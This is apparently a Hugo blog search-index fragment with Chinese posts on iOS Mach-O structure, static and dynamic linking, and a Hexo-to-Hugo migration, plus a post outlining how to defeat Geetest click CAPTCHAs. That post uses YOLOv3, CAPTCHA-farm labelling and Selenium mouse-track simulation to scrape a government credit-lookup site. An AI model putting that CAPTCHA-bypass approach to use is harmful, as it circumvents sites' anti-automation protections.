","date":"2021-03-10","objectID":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html:4:0","tags":["iOS","AOP"],"title":"OC方法\u0026OC类\u0026OC对象","uri":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html"},{"categories":["iOS"],"content":"实例对象 给 Person 类增加一个 age 属性，debug 查看 p 实例对象，发现实例对象只拷贝了类的成员变量，而没有类定义的方法。 ","date":"2021-03-10","objectID":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html:5:0","tags":["iOS","AOP"],"title":"OC方法\u0026OC类\u0026OC对象","uri":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html"},{"categories":["iOS"],"content":" iOS AOP文章系列 前导知识： Mach-O文件结构分析 静态链接\u0026动态链接 OC方法\u0026OC类\u0026OC对象 方法查找和消息转发 AOP框架： Method Swizzling Fishhook Apsects NSProxy AOP ","date":"2021-03-05","objectID":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html:0:0","tags":["iOS","AOP"],"title":"静态链接\u0026动态链接","uri":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html"},{"categories":["iOS"],"content":"静态链接 还是通过 🌰 来分析： ➜ ios cat bar.c int global = 1; void fizz(int a) { global = a; } ➜ ios cat main.c extern int global; void fizz(int a); int main() { fizz(100 + global); return 0; } 编译链接 bar.c 和 main.c 生成可执行文件 main ➜ ios xcrun -sdk iphoneos clang -c bar.c main.c -target arm64-apple-ios13.4 ➜ ios xcrun -sdk iphoneos clang bar.o main.o -o main -target arm64-apple-ios13.4 我们看下链接前后符号表的变化： ➜ ios jtool -S bar.o 0000000000000000 T _fizz 0000000000000020 D _global ➜ ios jtool -S main.o 0000000000000000 T _main U _fizz U _global ➜ ios jtool -S main 0000000100000000 T __mh_execute_header 0000000100007f54 T _fizz 0000000100008000 D _global 0000000100007f74 T _main U dyld_stub_binder 在链接前 bar.o 中 fizz 和 global 符号地址为临时地址，main.o 中 main 符号为临时地址，fizz 和 global 符号未定义，静态链接为可执行文件 main 后，发现各符号都有了对应地址，这中间发生了什么呢？ 其中关键就是符号的解析和重定位。 用 MachOView 查看 main.o 文件： 代码中符号的位置用 global 和 fizz 暂时用0x0和0x2c替代，链接器在完成地址空间分配后，就可以确定符号的虚拟地址了，链接器根据符号地址对每个需要重定位的指令进行地址修正，通过 _text 头中可以看到需要重定位的有三处以及重定位表偏移（488 = 0x1E8）。 而具体重定位信息在重定位表 Relocations 中： 重定位表结构为： struct relocation_info { int32_t r_address; /* offset in the section to what is being relocated */ uint32_t r_symbolnum:24, /* symbol index if r_extern == 1 or section ordinal if r_extern == 0 */ r_pcrel:1, /* was relocated pc relative already */ r_length:2, /* 0=byte, 1=word, 2=long, 3=quad */ r_extern:1, /* does not include value of sym referenced */ r_type:4; /* if not 0, machine specific relocation type */ }; 其 r_symbolnum 具体为 Symbol 符号表中 index 符号表是一个数组，元素结构为 nlist_64： struct nlist_64 { union { uint32_t n_strx; /* index into the string table */ } n_un; uint8_t n_type; /* type flag, see below */ uint8_t n_sect; /* section number or NO_SECT */ uint16_t n_desc; /* see \u003cmach-o/stab.h\u003e */ uint64_t n_value; /* value of this symbol (or stab offset) */ }; 链接后（main）的符号表，其 n_value 已经替换为真实地址： ","date":"2021-03-05","objectID":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html:1:0","tags":["iOS","AOP"],"title":"静态链接\u0026动态链接","uri":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html"},{"categories":["iOS"],"content":"动态链接 静态链接是运行前就用 ld 链接器链接成一个完整的程序，而动态链接是程序主模块被加载时候，通过 dyld 加载命令，把 dylib 加载到内存，然后将程序中所有未决议的符号绑定到相应的 dylib 中，并进行重定位工作。 动态链接器加载命令 LC_LOAD_DYLINKER： 动态链接库加载命令 LC_LOAD_DYLIB： 还是用之前的 🌰 ，但是我们通过动态链接库生成可执行文件 main_dyld ➜ ios xcrun -sdk iphoneos clang -c main.c -o main_dyld.o -target arm64-apple-ios13.4 ➜ ios xcrun -sdk iphoneos clang -fPIC -shared bar.c -o libbar.dylib -target arm64-apple-ios13.4 ➜ ios xcrun -sdk iphoneos clang main_dyld.o -o main_dyld -L . -l bar -target arm64-apple-ios13.4 我们查看 main_dyld 的符号表，发现并没有真实地址，但是标记了该符号来自动态库 libbar.dylib： 我们跟踪 _TEXT,__text 看下 global 变量 和 fizz 函数是如何重定位的 global 是通过 adrp 和 ldr 指令间接寻址，取0x100008000里面的值，而这个地址指向的 got(也称 Non-Lazy Symbol Pointers ) 表中： 在程序装载过程中，会重定位 got 表中地址，但是如何知道这是什么符号？以及这个符号来自哪里？ 这就需要用到 Section64 Header(__got) 中的 reserved1 字段，它代表在间接符号表（Indirect Symbols）中的 index 而间接符号表本身存的是符号表中的 index，可以看到 index=1 的项值为4，代表符号表中 index=4 的项 22代表在 String Table 中偏移22的字符串，即为 _global，并且描述 _global 来自 libbar.dylib 动态库，解决了上述两个问题，现在可以重定位 got 表中第一个符号地址。 在看下 fizz 函数的重定位过程 bl #0x100007f88 指向 _stubs 符号桩中 ➜ ios otool -v main_dyld -s __TEXT __stubs main_dyld: Contents of (__TEXT,__stubs) section 0000000100007f88 nop 0000000100007f8c ldr x16, #0x4074 ; Latency: 4 0000000100007f90 br x16 0x7f8c + 0x4074 = 0xc000 指向 __la_symbol_str 数据段 同样我们根据 Section64 Header(la_symbol_str) 中的 reserverd1 能够知道其符号名为 _fizz，而该函数的具体实现指向了 0x7fac （stub_helper 桩代码段) 通过 b #0x100007f94 跳到节头地址，然后走到 br x16 ，x16 为存储 0x1000080008 在的 dyld_stub_binder 函数 这个我们在Mach-O文件结构分析中已经讲过，是一个延迟绑定的过程，第一次调用外部函数，会调用 dyld_stub_binder 函数去寻址函数地址，然后写入 __la_symbol_str 段，之后再调同样的函数就会直接访问函数实现地址。我们看下 dyld_stub_binder 具体源码实现： #if __arm__ /* * sp+4 lazy binding info offset * sp+0 address of ImageLoader cache */ .text .align 2 .globl dyld_stub_binder dyld_stub_binder: stmfd sp!, {r0,r1,r2,r3,r7,lr} // save registers add r7, sp, #16 // point FP to previous FP ldr r0, [sp, #24] // move address ImageLoader cache to 1st parameter ldr r1, [sp, #28] // move lazy info offset 2nd parameter // call dyld::fastBindLazySymbol(loadercache, lazyinfo) bl __Z21_dyld_fast_stub_entryPvl mov ip, r0 // move the symbol`s address into ip ldmfd sp!, {r0,r1,r2,r3,r7,lr} // restore registers add sp, sp, #8 // remove meta-parameters bx ip // jump to the symbol`s address that was bound #endif /* __arm__ */ 调用 fastBindLazySymbol 函数，该函数也可以在 git 上找到： uintptr_t fastBindLazySymbol(ImageLoader** imageLoaderCache, uintptr_t lazyBindingInfoOffset) { uintptr_t result = 0; // get image if ( *imageLoaderCache == NULL ) { // save in cache *imageLoaderCache = dyld::findMappedRange((uintptr_t)imageLoaderCache); if ( *imageLoaderCache == NULL ) { const char* message = \"fast lazy binding from unknown image\"; dyld::log(\"dyld: %s\\n\", message); halt(message); } } // bind lazy pointer and return it try { result = (*imageLoaderCache)-\u003edoBindFastLazySymbol((uint32_t)lazyBindingInfoOffset, gLinkContext, (dyld::gLibSystemHelpers != NULL) ? dyld::gLibSystemHelpers-\u003eacquireGlobalDyldLock : NULL, (dyld::gLibSystemHelpers != NULL) ? dyld::gLibSystemHelpers-\u003ereleaseGlobalDyldLock : NULL); } catch (const char* message) { dyld::log(\"dyld: lazy symbol binding failed: %s\\n\", message); halt(message); } // return target address to glue which jumps to it with real parameters restored return result; } 真正进行符号绑定的操作在 doBindFastLazySymbol 中： uintptr_t ImageLoaderMachOCompressed::doBindFastLazySymbol(uint32_t lazyBindingInfoOffset, const LinkContext\u0026 context, void (*lock)(), void (*unlock)()) { // \u003crdar://problem/8663923\u003e race condition with flat-namespace lazy binding if ( this-\u003eusesTwoLevelNameSpace() ) { // two-level namespace lookup does not require lock because dependents can't be unloaded before this image } else { // acquire dyld global lock if ( lock != NULL ) lock(); } const uint8_t* const start = fLinkEditBase + fDyldInfo-\u003elazy_bind_off; const uint8_t* const end = \u0026start[fDyldInfo-\u003elazy_bind_size]; if ( lazyBindingInfoOffset \u003e fDyldInfo-\u003elazy_bind_size ) { dyld::throwf(\"fast lazy bind offset out of range (%u, max=%u) in image %s\", lazyBi","date":"2021-03-05","objectID":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html:2:0","tags":["iOS","AOP"],"title":"静态链接\u0026动态链接","uri":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html"},{"categories":["iOS"],"content":"PIC原理 上述 global 和 fizz 两个符号是在动态库中，而动态库是可以被多个进程共享的，而动态库编译时不知道自己在进程中的虚拟内存地址，因此动态库中不能包含绝对地址，那动态库如何将代码段做到与位置无关共享出去，就需要将对地址的引用分离，放到主程序数据部分（可修改），在加载和运行过程做寻址绑定操作。 ","date":"2021-03-05","objectID":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html:2:1","tags":["iOS","AOP"],"title":"静态链接\u0026动态链接","uri":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html"},{"categories":["iOS"],"content":"got 和 la_symbol_ptr 通过上述分析，我们可以看到动态库数据 (global) 地址放到 got (Non-Lazy Symbol Pointers) 数据段，非惰性代表动态链接阶段就寻找好所有数据符号的地址；而函数 (fizz) 用了延迟绑定技术，将外部函数地址放在 la_symbol_ptr (Lasy Symbol Pointers) 数据段，惰性的，程序第一次调用到这个函数才寻址真实地址并写入这个数据段。 ","date":"2021-03-05","objectID":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html:2:2","tags":["iOS","AOP"],"title":"静态链接\u0026动态链接","uri":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html"},{"categories":["iOS"],"content":" iOS AOP文章系列 前导知识： Mach-O文件结构分析 静态链接\u0026动态链接 OC方法\u0026OC类\u0026OC对象 方法查找和消息转发 AOP框架： Method Swizzling Fishhook Apsects NSProxy AOP ","date":"2021-03-01","objectID":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html:0:0","tags":["iOS","AOP"],"title":"Mach-O 文件结构分析","uri":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html"},{"categories":["iOS"],"content":"二进制结构 使用 MachoView 工具查看二进制执行文件，结构为： Header 头中魔术数字： 可执行格式 magic 用途 脚本 \\x7FELF 主要用于 shell 脚本，但是也常用语其他解释器，如 Perl, AWK 等。也就是我们常见的脚本文件中在 #! 标记后的字符串，即为执行命令的指令方式，以文件的 stdin 来传递命令 通用二进制格式 0xcafebabe 0xbebafeca 包含多种架构支持的二进制格式，只在 macOS 上支持 Mach-O 0xfeedface（32 位） 0xfeedfacf（64 位） macOS 的原生二进制格式 Mach-O 主要三部分： Header // 描述 MachO 的 cpu 架构、文件类型和加载命令等信息 Load Command // 描述文件中数据具体组织结构，不同数据类型使用不同加载命令表示，在文件加载解析时，被内核加载器或动态链接器调用，包含段加载命令（LC_SEGMENT_64） Sections //加载命令若包含节，节中具体存放数据或代码 具体数据结构定义可在源码中查看： Header： /* * The 64-bit mach header appears at the very beginning of object files for * 64-bit architectures. */ struct mach_header_64 { uint32_t magic; /* mach magic number identifier */ cpu_type_t cputype; /* cpu specifier */ cpu_subtype_t cpusubtype; /* machine specifier */ uint32_t filetype; /* type of file */ uint32_t ncmds; /* number of load commands */ uint32_t sizeofcmds; /* the size of all the load commands */ uint32_t flags; /* flags */ uint32_t reserved; /* reserved */ }; Segment: /* * The 64-bit segment load command indicates that a part of this file is to be * mapped into a 64-bit task's address space. If the 64-bit segment has * sections then section_64 structures directly follow the 64-bit segment * command and their size is reflected in cmdsize. */ struct segment_command_64 { /* for 64-bit architectures */ uint32_t cmd; /* LC_SEGMENT_64 */ uint32_t cmdsize; /* includes sizeof section_64 structs */ char segname[16]; /* segment name */ uint64_t vmaddr; /* memory address of this segment */ uint64_t vmsize; /* memory size of this segment */ uint64_t fileoff; /* file offset of this segment */ uint64_t filesize; /* amount to map from the file */ vm_prot_t maxprot; /* maximum VM protection */ vm_prot_t initprot; /* initial VM protection */ uint32_t nsects; /* number of sections in segment */ uint32_t flags; /* flags */ }; Sections: struct section_64 { /* for 64-bit architectures */ char sectname[16]; /* name of this section */ char segname[16]; /* segment this section goes in */ uint64_t addr; /* memory address of this section */ uint64_t size; /* size in bytes of this section */ uint32_t offset; /* file offset of this section */ uint32_t align; /* section alignment (power of 2) */ uint32_t reloff; /* file offset of relocation entries */ uint32_t nreloc; /* number of relocation entries */ uint32_t flags; /* flags (section type and attributes)*/ uint32_t reserved1; /* reserved (for offset or index) */ uint32_t reserved2; /* reserved (for count or sizeof) */ uint32_t reserved3; /* reserved */ }; Note section_64 的结构体中有几个比较重要的数据，reloff（重定位表偏移）、nreloc（重定位符号个数）、reserved1（动态符号表偏移），在静态链接和动态链接中发挥重要作用。 在 静态链接\u0026动态链接 文章中加以介绍。 ","date":"2021-03-01","objectID":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html:1:0","tags":["iOS","AOP"],"title":"Mach-O 文件结构分析","uri":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html"},{"categories":["iOS"],"content":"举个🌰直观感受下 简单Demo程序： // person.m NSString *string1 = @\"it is string1\"; NSString *string2; @implementation Person - (void)sleep { NSLog(@\"i am sleeping\"); } - (void)walk { printf(@\"i am walking\"); } + (void)grow { static NSString *string3 = @\"it is string3\"; static NSString *string4; NSLog(@\"%@_%@\", string3, string4); } @end // person+other.m @implementation Person (other) - (void)ill { NSLog(@\"i am fall ill\"); } - (void)sleep { NSLog(@\"i need sleeping\"); } @end // main.m void run() { NSLog(@\"i am running\"); } int main(int argc, const char * argv[]) { @autoreleasepool { // insert code here... NSLog(@\"Hello, World!\"); Person *p = [[Person alloc] init]; [p walk]; [p ill]; [p sleep]; run(); } return 0; } 程序包含 Person 类，两个实例方法和一个类方法，同时包含一个 Person 的 Category 类，额外扩展和覆盖了原类。还实现了一个 C 函数 run()。 在 LC_MAIN 段可以知道程序 main 函数入口偏移地址 0x3E00： 具体汇编代码在 Section64(__TEXT,__text) 中： 我们也可以使用 otool 工具反汇编代码，具体分析下程序如何使用各段节数据 ➜ Debug otool -tV TestMacho1 TestMacho1: (__TEXT,__text) section -[Person(other) ill]: 0000000100003ce0 pushq %rbp 0000000100003ce1 movq %rsp, %rbp 0000000100003ce4 subq $0x10, %rsp 0000000100003ce8 leaq 0x321(%rip), %rax ## Objc cfstring ref: @\"bad cfstring ref\" 0000000100003cef movq %rdi, -0x8(%rbp) 0000000100003cf3 movq %rsi, -0x10(%rbp) 0000000100003cf7 movq %rax, %rdi 0000000100003cfa movb $0x0, %al 0000000100003cfc callq 0x100003ea6 ## symbol stub for: _NSLog 0000000100003d01 addq $0x10, %rsp 0000000100003d05 popq %rbp 0000000100003d06 retq 0000000100003d07 nopw (%rax,%rax) -[Person(other) sleep]: 0000000100003d10 pushq %rbp 0000000100003d11 movq %rsp, %rbp 0000000100003d14 subq $0x10, %rsp 0000000100003d18 leaq 0x311(%rip), %rax ## Objc cfstring ref: @\"bad cfstring ref\" 0000000100003d1f movq %rdi, -0x8(%rbp) 0000000100003d23 movq %rsi, -0x10(%rbp) 0000000100003d27 movq %rax, %rdi 0000000100003d2a movb $0x0, %al 0000000100003d2c callq 0x100003ea6 ## symbol stub for: _NSLog 0000000100003d31 addq $0x10, %rsp 0000000100003d35 popq %rbp 0000000100003d36 retq 0000000100003d37 nop 0000000100003d38 nop 0000000100003d39 nop 0000000100003d3a nop 0000000100003d3b nop 0000000100003d3c nop 0000000100003d3d nop 0000000100003d3e nop 0000000100003d3f nop -[Person sleep]: 0000000100003d40 pushq %rbp 0000000100003d41 movq %rsp, %rbp 0000000100003d44 subq $0x10, %rsp 0000000100003d48 leaq 0x321(%rip), %rax ## Objc cfstring ref: @\"bad cfstring ref\" 0000000100003d4f movq %rdi, -0x8(%rbp) 0000000100003d53 movq %rsi, -0x10(%rbp) 0000000100003d57 movq %rax, %rdi 0000000100003d5a movb $0x0, %al 0000000100003d5c callq 0x100003ea6 ## symbol stub for: _NSLog 0000000100003d61 addq $0x10, %rsp 0000000100003d65 popq %rbp 0000000100003d66 retq 0000000100003d67 nopw (%rax,%rax) -[Person walk]: 0000000100003d70 pushq %rbp 0000000100003d71 movq %rsp, %rbp 0000000100003d74 subq $0x10, %rsp 0000000100003d78 leaq 0x311(%rip), %rax ## Objc cfstring ref: @\"bad cfstring ref\" 0000000100003d7f movq %rdi, -0x8(%rbp) 0000000100003d83 movq %rsi, -0x10(%rbp) 0000000100003d87 movq %rax, %rdi 0000000100003d8a movb $0x0, %al 0000000100003d8c callq 0x100003ec4 ## symbol stub for: _printf 0000000100003d91 addq $0x10, %rsp 0000000100003d95 popq %rbp 0000000100003d96 retq 0000000100003d97 nopw (%rax,%rax) +[Person grow]: 0000000100003da0 pushq %rbp 0000000100003da1 movq %rsp, %rbp 0000000100003da4 subq $0x10, %rsp 0000000100003da8 leaq 0x321(%rip), %rax ## Objc cfstring ref: @\"bad cfstring ref\" 0000000100003daf movq %rdi, -0x8(%rbp) 0000000100003db3 movq %rsi, -0x10(%rbp) 0000000100003db7 movq _grow.string3(%rip), %rsi 0000000100003dbe movq _grow.string4(%rip), %rdx 0000000100003dc5 movq %rax, %rdi 0000000100003dc8 movb $0x0, %al 0000000100003dca callq 0x100003ea6 ## symbol stub for: _NSLog 0000000100003dcf addq $0x10, %rsp 0000000100003dd3 popq %rbp 0000000100003dd4 retq 0000000100003dd5 nop 0000000100003dd6 nop 0000000100003dd7 nop 0000000100003dd8 nop 0000000100003dd9 nop 0000000100003dda nop 0000000100003ddb nop 0000000100003ddc nop 0000000100003ddd nop 0000000100003dde nop 00000","date":"2021-03-01","objectID":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html:2:0","tags":["iOS","AOP"],"title":"Mach-O 文件结构分析","uri":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html"},{"categories":["iOS"],"content":"总结 文中分析涉及到多个 Section，我们在这里做个汇总 名称 作用 __TEXT,__text 可执行机器码 __TEXT,__stubs 符号桩，跳转到 __la_symbol_ptr 表对应地址 __TEXT,__stub_helper 桩函数，la_symbol_ptr 表中没有找到真正符号地址时，均指向这，通过 dyld_stub_binder 找到函数实现地址并替换 la_symbol_pt r表项 __TEXT,__cstring 字符串 __TEXT,__objc_classname 类名 __DATA,__cfstring 保存 Objc 字符串类型、大小、值信息 __DATA,__objc_const _class_t 中 class_ro_t 结构体，以及类函数列表存储在此节 __DATA,__objc_selrefs SEL 函数名地址 __DATA,__objc_classrefs OC 类地址 __DATA,__la_symbol_ptr 动态链接时，延迟绑定需要，跳转到 TEXT,stub_helper 对应地址 __DATA,__objc_data _class_t 类结构体存储在此节 ","date":"2021-03-01","objectID":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html:3:0","tags":["iOS","AOP"],"title":"Mach-O 文件结构分析","uri":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html"},{"categories":["iOS"],"content":"探究 在 MachO 文件结构还未讲到的 LC_SEGMENT_64(_LINKEDIT)、LC_SYMTAB、LCDYSYMTAB、LC_LOAD_DYLIB、Symbol Table和Dynamic Symbol Table等作用 这些段节涉及静态/动态链接原理 动态链接中延迟绑定技术 OC方法本质/OC类对象/实例对象 类结构体中isa指针 Runtime 机制中方法查找和消息转发机制 fishhook 是如何利用符号绑定技术实现动态 hook 后续我们会一一解密，敬请期待… ","date":"2021-03-01","objectID":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html:4:0","tags":["iOS","AOP"],"title":"Mach-O 文件结构分析","uri":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html"},{"categories":["Others"],"content":"最近逛Gayhub看到Hugo，不管框架怎么样，先进官网看主题，颜狗瞬间被皮肤所吸引，回头默默看了下自己的博客，不就是荣耀水晶皮肤和没皮肤的区别么！再浏览文档和上手体验后，竟然还体会到了+10点攻击力的感受，安装、配置、部署、主题、MD即显、Actions配套等处处体现Hugo的简洁、灵活和高效！ 随即开始了迁徙之路（主要是想换个皮提高下写Blog的动力）… ","date":"2020-07-13","objectID":"/posts/blog%E8%BF%81%E7%A7%BB.html:0:0","tags":["Hugo","GithubActions","LoveIt"],"title":"Blog From Hexo To Hugo","uri":"/posts/blog%E8%BF%81%E7%A7%BB.html"},{"categories":["Others"],"content":"安装 参照官档： https://gohugo.io/documentation/ 同时Hugo Demo站也提供了详尽文档： https://hugoloveit.com ","date":"2020-07-13","objectID":"/posts/blog%E8%BF%81%E7%A7%BB.html:1:0","tags":["Hugo","GithubActions","LoveIt"],"title":"Blog From Hexo To Hugo","uri":"/posts/blog%E8%BF%81%E7%A7%BB.html"},{"categories":["Others"],"content":"主题 个人喜欢黑白极简： https://themes.gohugo.io/loveit/ ","date":"2020-07-13","objectID":"/posts/blog%E8%BF%81%E7%A7%BB.html:2:0","tags":["Hugo","GithubActions","LoveIt"],"title":"Blog From Hexo To Hugo","uri":"/posts/blog%E8%BF%81%E7%A7%BB.html"},{"categories":["Others"],"content":"配置 着重说下三个小坑： 搜索功能 未使用开箱即用的lunr（听说对中文不友好），直接用algolia，除了根据Hugo文档配置config.toml对应部分外，为了后续实现Github Actions自动化部署，而使用atomic-algolia，额外需要通过npm init生成package.json后，在其中添加： ... \"scripts\": { \"test\": \"echo \\\"Error: no test specified\\\" \u0026\u0026 exit 1\", \"algolia\": \"atomic-algolia\" }, ... `` Actions中workflow配置： - name:Setup Nodeuses:actions/setup-node@v2.1.0with:node-version:'12.x'# ... #- name:Setup Algoliaenv:ALGOLIA_APP_ID:63ROI1DYLOALGOLIA_ADMIN_KEY:${{ secrets.ALGOLIA_ADMIN_KEY }}ALGOLIA_INDEX_NAME:houugen_blogALGOLIA_INDEX_FILE:public/index.jsonrun:npm install atomic-algolia \u0026\u0026 npm run algolia Note ALGOLIA_ADMIN_KEY为Algolia API Keys中的Admin API Key，将其值添加到Github的Secrets中 文档图片 之前使用Hexo时文章和图片文件夹并行在posts中 ➜ houugen.github.io git:(hugo) ✗ tree posts posts/ ├── Blockchain-Security-Articles.md ├── Blockchain-WordCloud │ ├── 1.png │ ├── 2.png │ └── 3.png ├── Blockchain-WordCloud.md 但是迁移到Hugo后图片都无法显示，看了文档明白是路径问题，图片资源可以放在根路径的static中，这样文章图片是能显示，但是需要修改大量文章中的图片引用路径，查阅资料后发现可以在config.toml中插入uglyurls = true解决。 但是又引入了新Bug 😭，站头的Posts、Tags、Categories均无法正常解析了，在主题的issues搜索发现有解决方法：https://github.com/dillonzq/LoveIt/issues/266 自动化发布 使用了 peaceiris/actions-gh-pages@v3 发布GitPage，创建并使用SSH Deploy Key后发布成功 如果你有其他解析域名，需要使用参数cname: your domain，否则每次发布后会覆盖删除GitPage仓的CNAME文件。 最后附上我的Github Actions 工作流配置文件： name:Hugo Build and Deployon:push:branches:[hugo ]jobs:build_deploy:runs-on:ubuntu-18.04steps:- name:Checkoutuses:actions/checkout@v2with:ref:'hugo'submodules:truefetch-depth:0- name:Setup Nodeuses:actions/setup-node@v2.1.0with:node-version:'12.x'- name:Setup Hugouses:peaceiris/actions-hugo@v2with:hugo-version:'latest'extended:true- name:Buildrun:hugo --minify- name:Deployuses:peaceiris/actions-gh-pages@v3with:deploy_key:${{ secrets.ACTIONS_DEPLOY_KEY }}publish_dir:./publicpublish_branch:mastercname:houugen.fun- name:Setup Algoliaenv:ALGOLIA_APP_ID:63ROI1DYLOALGOLIA_ADMIN_KEY:${{ secrets.ALGOLIA_ADMIN_KEY }}ALGOLIA_INDEX_NAME:houugen_blogALGOLIA_INDEX_FILE:public/index.jsonrun:npm install atomic-algolia \u0026\u0026 npm run algolia","date":"2020-07-13","objectID":"/posts/blog%E8%BF%81%E7%A7%BB.html:3:0","tags":["Hugo","GithubActions","LoveIt"],"title":"Blog From Hexo To Hugo","uri":"/posts/blog%E8%BF%81%E7%A7%BB.html"},{"categories":["Others"],"content":"感受 主题真的好看😂，而且又有很多实用功能，比如流程图、嵌入音视频、数学公式和Shortcodes等 之前Hexo用的travis自动部署，而Github Actions体验更加方便，配合各种action能清晰快捷的编写工作流 Hugo的毫秒级部署不吹了，而且编写Markdown还能即时网页查看，舒服 ","date":"2020-07-13","objectID":"/posts/blog%E8%BF%81%E7%A7%BB.html:4:0","tags":["Hugo","GithubActions","LoveIt"],"title":"Blog From Hexo To Hugo","uri":"/posts/blog%E8%BF%81%E7%A7%BB.html"},{"categories":["Spider"],"content":"背景 国家企业信用信息公示系统查询时使用极验验证码，大概率为第三代汉字语序点选识别。 查询资料发现可使用深度学习进行汉字定位及分类。 参考资料： https://runninggump.github.io/2018/11/19/破解含语序问题的点击验证码 https://cos120.github.io/crack/ https://www.cnblogs.com/codefish/p/10104320.html http://www.aneasystone.com/archives/2018/03/python-selenium-geetest-crack.html 实践后效果： 使用的框架、算法及工具： 定位\u0026分类 样本标注：labelImg、若快 训练框架：darknet yolov3 语序识别 百度ocr 结巴分词 百度搜索词频统计 模拟 selenium 滑动轨迹：利用jquery.easing模拟人工轨迹 ","date":"2019-01-04","objectID":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html:1:0","tags":["Geetest","DeepLearning"],"title":"深度学习识别汉字点选验证码","uri":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html"},{"categories":["Spider"],"content":"踩坑 汉字定位和分类学习详尽的实践步骤参考资料中都有说明，这里不再叙述。这里记录下实践过程中踩的坑及一些特殊处理。 ","date":"2019-01-04","objectID":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html:2:0","tags":["Geetest","DeepLearning"],"title":"深度学习识别汉字点选验证码","uri":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html"},{"categories":["Spider"],"content":"darknet环境 坑1：不要使用cpu训练 windows/linux推荐使用 AlexeyAB/darknet，专门定制。 VS2017 + VC++2015 v140工具集 CUDA9.0 （坑2： 10.0 在win10 nvidia gtx 1080 ti上报 cuda error:no error，==！答案搜都搜不到，耽搁许久尝试降级才成功） OpenCV 3.4.0 cuDNN7.1 ","date":"2019-01-04","objectID":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html:2:1","tags":["Geetest","DeepLearning"],"title":"深度学习识别汉字点选验证码","uri":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html"},{"categories":["Spider"],"content":"分类样本 坑3：使用手工标注汉字分类样本500张1h后发现刚不住，可使用打码平台，多进程8w张3h搞定。 坑4：分离1.3k汉字训练后验证100张发现准确率同样为85%！无需更多样本分离更多汉字。 坑5：人工打码准确率不能奢望，又花费1h对词频小于10的茫茫多汉字进行修正（脚本在仓库）。 